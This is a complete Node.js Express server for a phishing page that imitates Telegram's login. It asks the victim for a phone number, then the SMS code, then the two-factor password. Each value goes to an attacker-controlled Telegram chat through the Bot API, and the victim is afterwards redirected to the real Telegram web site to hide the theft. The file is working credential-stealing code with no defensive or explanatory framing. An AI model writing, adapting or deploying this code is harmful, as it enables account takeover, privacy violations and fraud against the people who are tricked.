const express = require('express');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

const TELEGRAM_BOT_TOKEN = process.env.TOKEN;
const TELEGRAM_CHAT_ID = process.env.CHAT_ID;

function sendToTelegram(text) {
  if (!TELEGRAM_BOT_TOKEN) return;
  axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    chat_id: TELEGRAM_CHAT_ID,
    text: text
  }).catch(e => console.log(e.message));
}

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const sessions = {};

// Стили
function getStyle() {
  return `*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:#0f0f0f;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}.card{background:#1f1f1f;border-radius:28px;padding:32px 24px;max-width:400px;width:100%;box-shadow:0 8px 24px rgba(0,0,0,0.4);text-align:center}.logo{text-align:center;margin-bottom:24px}h2{color:#fff;margin-bottom:8px}.sub{color:#888;margin-bottom:28px}input{width:100%;padding:14px 16px;background:#2a2a2a;border:none;border-radius:14px;color:white;font-size:16px;margin-bottom:16px;outline:none}button{width:100%;padding:14px;background:#2c7be5;border:none;border-radius:14px;color:white;font-size:16px;font-weight:600;cursor:pointer}button:hover{background:#1a68d1}`;
}

function getPage(title, subtitle, formAction, fields, hidden = {}) {
  const fieldsHtml = fields.map(f => `<input type="${f.type}" name="${f.name}" placeholder="${f.placeholder}" required>`).join('');
  const hiddenHtml = Object.entries(hidden).map(([k,v]) => `<input type="hidden" name="${k}" value="${v}">`).join('');
  return `<!DOCTYPE html>
<html><head><title>Telegram</title><meta name="viewport" content="width=device-width, initial-scale=1"><style>${getStyle()}</style></head>
<body><div class="card"><div class="logo"><svg viewBox="0 0 24 24" fill="#2c7be5" width="48" height="48"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z"/></svg></div><h2>${title}</h2><div class="sub">${subtitle}</div><form action="${formAction}" method="post">${hiddenHtml}${fieldsHtml}<button type="submit">Next</button></form></div></body></html>`;
}

function getSuccessPage() {
  return `<!DOCTYPE html><html><head><title>Success</title><meta name="viewport" content="width=device-width, initial-scale=1"><style>${getStyle()}</style></head><body><div class="card"><h2>Success</h2><p>Redirecting to Telegram...</p><script>setTimeout(()=>{window.location="https://web.telegram.org"},2000)</script></div></body></html>`;
}

app.get('/', (req, res) => {
  res.send(getPage('Telegram', 'Sign in to your account', '/send-code', [{ name: 'phone', placeholder: 'Phone number', type: 'text' }]));
});

app.post('/send-code', (req, res) => {
  const { phone } = req.body;
  const sessionId = Date.now().toString();
  sessions[sessionId] = { phone };
  sendToTelegram(`📞 PHONE: ${phone}`);
  res.send(getPage('Verification code', `We've sent a code to ${phone}`, '/verify-code', [{ name: 'code', placeholder: 'Enter code', type: 'text' }], { session: sessionId }));
});

app.post('/verify-code', (req, res) => {
  const { session, code } = req.body;
  const sessionData = sessions[session];
  if (!sessionData) return res.send(getErrorPage('Session expired'));

  sendToTelegram(`🔐 SMS CODE: ${code} | Phone: ${sessionData.phone}`);
  sessionData.code = code;

  res.send(getPage('Enter password', 'Your account has an additional password', '/submit-password', [{ name: 'password', placeholder: 'Password', type: 'password' }], { session }));
});

app.post('/submit-password', (req, res) => {
  const { session, password } = req.body;
  const sessionData = sessions[session];
  if (!sessionData) return res.send(getErrorPage('Session expired'));

  sendToTelegram(`🔐 2FA PASSWORD: ${password}\nPhone: ${sessionData.phone}\nCode: ${sessionData.code}`);
  delete sessions[session];

  res.send(getSuccessPage());
});

function getErrorPage(msg) {
  return `<!DOCTYPE html><html><head><title>Error</title><meta name="viewport" content="width=device-width, initial-scale=1"><style>${getStyle()}</style></head><body><div class="card"><h2>Error</h2><p>${msg}</p></div></body></html>`;
}

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
